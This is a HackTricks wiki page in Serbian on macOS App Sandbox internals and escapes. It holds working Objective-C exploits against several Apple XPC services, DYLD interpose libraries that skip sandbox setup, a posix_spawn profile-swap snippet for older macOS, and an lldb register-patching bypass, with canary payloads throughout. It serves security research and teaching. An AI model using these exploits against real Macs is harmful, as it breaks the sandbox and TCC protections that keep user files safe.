# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Proces učitavanja Sandbox-a

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Slika preuzeta sa <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na prethodnoj slici moguće je videti **kako se sandbox učitava** kada se pokrene aplikacija sa entitlement-om **`com.apple.security.app-sandbox`**.

Kompajler će povezati `/usr/lib/libSystem.B.dylib` sa binarnom datotekom.

Zatim **`libSystem.B`** poziva nekoliko funkcija dok **`xpc_pipe_routine`** ne pošalje entitlement-e aplikacije servisu **`securityd`**. Securityd proverava da li proces treba da bude izolovan u sandbox-u i, ako treba, izoluje ga.\
Na kraju se sandbox aktivira pozivom **`__sandbox_ms`**, koji poziva **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Mogući bypass-i

### Zaobilaženje atributa quarantine

**Datotekama koje kreiraju procesi u sandbox-u** dodaje se **quarantine atribut** kako bi se sprečili izlazi iz sandbox-a: ako ubacite novu aplikaciju i pokušate da je pokrenete, quarantine zastavica će je zaustaviti. Zato **ako možete da ubacite datoteku ili fasciklu *bez* quarantine atributa, možete da izađete iz App Sandbox-a** — samo ubacite `.app` paket i pokrenite ga pomoću `open`, jer će novopokrenuti proces biti pod kontrolom LaunchServices-a, a ne vašeg sandbox-a.

Pouzdan način da se datoteka **ubaci bez quarantine atributa** jeste da zatražite od **drugog procesa da je kreira**. Kao što je dokumentovano u tekstu [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) autora Mickey Jin, **App Sandbox** označava ubačene datoteke atributom quarantine, ali **XPC servisi koji rade u Service Sandbox-u to ne rade**. Zbog toga bi nekoliko neautentifikovanih XPC servisa moglo da se iskoristi kao primitiv za „pranje quarantine atributa“:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) i **CVE-2023-32414** (`ArchiveService`): raspakuju arhivu koju im prosledi aplikacija u sandbox-u na izabranu lokaciju **bez prenosa quarantine xattr atributa na raspakovani sadržaj**.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal u funkciji `submitSignpostDataWithConfig:` omogućavao je kreiranje **proizvoljnih direktorijuma bez quarantine atributa**, što je dovoljno za izgradnju cele strukture `.app` paketa izvan kontejnera.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): priključuje DMG označen atributom quarantine **bez označavanja rezultujućeg uređaja**, pa se aplikacije na montiranom volumenu mogu pokrenuti.

> [!TIP]
> Raspakivanje obično **uklanja bit dozvole za izvršavanje**. Zaobilazno rešenje korišćeno u CVE-2023-27944 bilo je da se kao glavna izvršna datoteka paketa postavi **symlink** ka postojećoj potpisanoj sistemskoj binarnoj datoteci (npr. `/System/Library/CoreServices/Automator Application Stub`), koja ostaje pokretljiva bez potrebe za dozvolom `+x` na ubačenoj datoteci.

> [!CAUTION]
> Ovo funkcioniše zato što provera zavisi od **zastavice na stavci koja se pokreće**: *„Kada se aplikacija ili drugi izvršni kod pokrene iz Finder-a ili grafičkog interfejsa, macOS proverava njenu quarantine zastavicu pre učitavanja“*, i tek tada *„prosleđuje je Gatekeeper-u radi potpunih bezbednosnih provera pri prvom pokretanju“* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Ako na paketu koji pokrećete nema zastavice, nema ni provere Gatekeeper-a — upravo to omogućavaju CVE-ovi navedeni iznad.<sup>[[5]](#references)</sup>
>
> Imajte na umu da, ako je `.app` paket već odobren za pokretanje (ima quarantine xattr sa zastavicom „authorized to run“), možete ga i zloupotrebiti... osim što sada ne možete da upisujete unutar paketa **`.app`** ako nemate neke privilegovane TCC dozvole (koje nećete imati unutar sandbox-a).

### Zloupotreba funkcije Open

U [**poslednjim primerima zaobilaženja Word sandbox-a**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) može se videti kako se funkcija komandne linije **`open`** može zloupotrebiti za zaobilaženje sandbox-a.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Čak i kada je aplikacija **namenjena radu u sandbox-u** (`com.apple.security.app-sandbox`), moguće je zaobići sandbox ako se aplikacija **pokreće iz LaunchAgent-a** (na primer, `~/Library/LaunchAgents`).\
Kao što je objašnjeno u [**ovoj objavi**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ako želite da obezbedite persistence pomoću aplikacije koja je u sandbox-u, možete je podesiti da se automatski pokreće kao LaunchAgent i možda ubaciti zlonamerni kod preko DyLib environment promenljivih.<sup>[[6]](#references)</sup>

### Zloupotreba lokacija za automatsko pokretanje

Ako proces u sandbox-u može da **upisuje** na lokaciju na kojoj će **neizolovana aplikacija kasnije pokrenuti binarnu datoteku**, moći će da **izađe iz sandbox-a tako što će tamo postaviti** binarnu datoteku. Dobri primeri takvih lokacija su `~/Library/LaunchAgents` i `/System/Library/LaunchDaemons`.

Za ovo će vam možda biti potrebna čak **2 koraka**: da proces sa **popustljivijim sandbox-om** (`file-read*`, `file-write*`) izvrši vaš kod, koji će zatim upisati datoteku na lokaciju sa koje će biti **pokrenuta van sandbox-a**.

Pogledajte ovu stranicu o **lokacijama za automatsko pokretanje**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Zloupotreba drugih procesa

Ako iz procesa u sandbox-u možete da **kompromitujete druge procese** koji rade u manje restriktivnim sandbox-ima (ili uopšte nisu u sandbox-u), moći ćete da izađete iz svog sandbox-a i dospete u njihove:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Dostupni Mach servisi sistema i korisnika

Sandbox takođe dozvoljava komunikaciju sa određenim **Mach servisima** preko XPC-a, definisanim u profilu `application.sb`. Ako možete da **zloupotrebite** neki od ovih servisa, možda ćete moći da **izađete iz sandbox-a**.

Kao što je navedeno u [ovom tekstu](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), informacije o Mach servisima čuvaju se u `/System/Library/xpc/launchd.plist`. Sve Mach servise sistema i korisnika možete pronaći pretragom `<string>System</string>` i `<string>User</string>` u toj datoteci.<sup>[[4]](#references)</sup>

Pored toga, možete da proverite da li je Mach servis dostupan aplikaciji u sandbox-u pozivom funkcije `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Dostupne PID Mach usluge

Ove Mach usluge su prvi put iskorišćene za [izlazak iz sandboxa u ovom writeupu](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Tada su **sve XPC usluge koje su zahtevale** aplikacija i njen framework bile vidljive u PID domenu aplikacije (to su Mach usluge čiji je `ServiceType` postavljen na `Application`).<sup>[[4]](#references)</sup>

Da biste **kontaktirali XPC uslugu PID domena**, potrebno je samo da je registrujete unutar aplikacije linijom kao što je:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Štaviše, sve **Application** Mach servise moguće je pronaći pretraživanjem `System/Library/xpc/launchd.plist` u potrazi za `<string>Application</string>`.

Drugi način da pronađete važeće xpc servise jeste da proverite one u:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Nekoliko primera zloupotrebe ove tehnike možete pronaći u [**originalnom writeup-u**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), ali u nastavku su navedeni neki sažeti primeri.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Ovaj servis prihvata svaku XPC vezu tako što uvek vraća `YES`, a metod `runTask:arguments:withReply:` izvršava proizvoljnu komandu sa proizvoljnim parametrima.

Exploit je bio „jednostavan kao”:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Ovaj XPC service je dozvoljavao pristup svim klijentima tako što je uvek vraćao `YES`, a metoda `createZipAtPath:hourThreshold:withReply:` prihvatala je putanju do fascikle i komprimovala je u ZIP datoteku.

Zato je moguće generisati lažnu strukturu fascikli aplikacije, komprimovati je, a zatim je dekomprimovati i izvršiti kako bi se izašlo iz sandbox-a, jer nove datoteke neće imati atribut quarantine.

Exploit je bio:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Ovaj XPC servis omogućava da se XPC klijentu dodeli pristup za čitanje i pisanje proizvoljnom URL-u putem metode `extendAccessToURL:completion:`, koja je prihvatala bilo koju vezu. Pošto XPC servis ima FDA, moguće je zloupotrebiti ove dozvole i potpuno zaobići TCC.

Exploit je bio:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Statičko kompajliranje i dinamičko povezivanje

[**Ovo istraživanje**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) otkrilo je 2 načina za zaobilaženje Sandbox-a. Pošto se sandbox primenjuje iz userland-a kada se učita biblioteka **libSystem**, binarni fajl bi izbegao sandbox ako bi mogao da je ne učita:<sup>[[2]](#references)</sup>

- Ako bi binarni fajl bio **potpuno statički kompajliran**, mogao bi da izbegne učitavanje te biblioteke.
- Ako **binarni fajl ne bi morao da učita nijednu biblioteku** (jer se i linker nalazi u libSystem-u), ne bi morao da učita libSystem.

### Shellcodes

Imajte na umu da čak i **shellcodes** u ARM64 moraju da budu povezani sa `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Ograničenja koja se ne nasleđuju

Kao što je objašnjeno u **[bonus delu ovog writeup-a](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, sandbox ograničenje poput:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

može se zaobići pokretanjem novog procesa, na primer:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Međutim, naravno, ovaj novi proces neće naslediti entitlements ili privilegije roditeljskog procesa.

### Zamena nasleđenog sandbox-a atributima spawn-a (stariji macOS)

Običan `posix_spawn()` proces potomak nasleđuje sandbox roditeljskog procesa. U verzijama macOS-a pre ispravke iz februara 2026, sandbox-ovani roditeljski proces mogao je umesto toga da prosledi **ugrađeno ime profila** MAC politici `Sandbox` putem funkcije `posix_spawnattr_setmacpolicyinfo_np()`. Proces potomak je tada dobijao taj profil *umesto* ograničenja roditeljskog procesa. Ugrađeni profil `no-network` i dalje je dozvoljavao pristup korisnikovom matičnom direktorijumu, pa je proces potomak, kao što je `/bin/bash`, mogao da radi sa datotekama kojima roditeljski proces App Sandbox-a nije mogao da pristupi. To se razlikuje od [LaunchServices `open` putanje](#not-inherited-restrictions), u kojoj zasebna usluga pokreće proces. Više o opštem putu za prosleđivanje ulaza potražite u odeljku [Atributi pokretanja specifični za MACF politiku](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input).<sup>[[7]](#references)</sup>

Da biste testirali granicu na **izolovanom macOS hostu na koji utiče problem**, napravite bezopasan canary u matičnom direktorijumu, izvan kontejnera aplikacije. Pokrenite isti proces potomak iz već sandbox-ovanog roditeljskog procesa, prvo pomoću običnog `posix_spawn()`, a zatim pomoću blob-a Sandbox atributa za pokretanje koji bira `no-network`; uporedite da li proces potomak može da pročita canary. Sledeći isečak koristi privatnu definiciju `sandbox_spawnattr_t` i deklaracije funkcija iz Siguza-inog [primerka pokretača](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec). Prilikom integracije u testnu aplikaciju dodajte uobičajenu obradu grešaka.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Uspešan povratak iz `posix_spawn()` nije dokaz izlaska iz sandboxa: proverite **efektivni pristup datotekama deteta** u odnosu na uobičajeno ponašanje deteta. Zakrpani sistemi odbijaju ugrađeni profil koji zatraži pozivalac koji se već nalazi u sandboxu, osim ako ima privatno ovlašćenje `com.apple.private.security.sandbox-spawnattrs`. Nemojte smatrati ovo istorijsko ponašanje aktuelnim načinom zaobilaženja zaštite.<sup>[[7]](#references)</sup>

### Entitlements

Imajte na umu da sandbox može da **dozvoli** neke **radnje** ako aplikacija ima određeno **ovlašćenje**, kao u:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Za više informacija o **Interposting** pogledajte:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` da biste sprečili sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Presresti `__mac_syscall` da bi se sprečio Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Debugovanje i zaobilaženje Sandbox-a pomoću lldb

Hajde da kompajliramo aplikaciju koja bi trebalo da bude u sandbox-u:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Zatim kompajlirajte aplikaciju:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> Aplikacija će pokušati da **pročita** datoteku **`~/Desktop/del.txt`**, što **Sandbox** neće dozvoliti.\
> Napravite datoteku tamo, jer će moći da je pročita kada se Sandbox zaobiđe:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Hajde da debagujemo aplikaciju da vidimo kada se učitava Sandbox:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Čak i kada je Sandbox zaobiđen, TCC** će pitati korisnika da li želi da dozvoli procesu da čita datoteke sa radne površine

## References

- [1] [Jonathan Levin - Apple Sandbox: Dublje u živo blato (slajdovi sa HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Izlazak iz sandboxa Mac App Store-a](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Dublje u živo blato (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Nova era izlazaka iz macOS Sandbox-a](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Objašnjenje: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Zaobilaženje macOS TCC-a pomoću Telegrama uz DyLib Injection (2. deo)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Izlazak iz Apple Sandbox-a pokretanjem izvršne datoteke](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec, ali za ugrađene profile](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
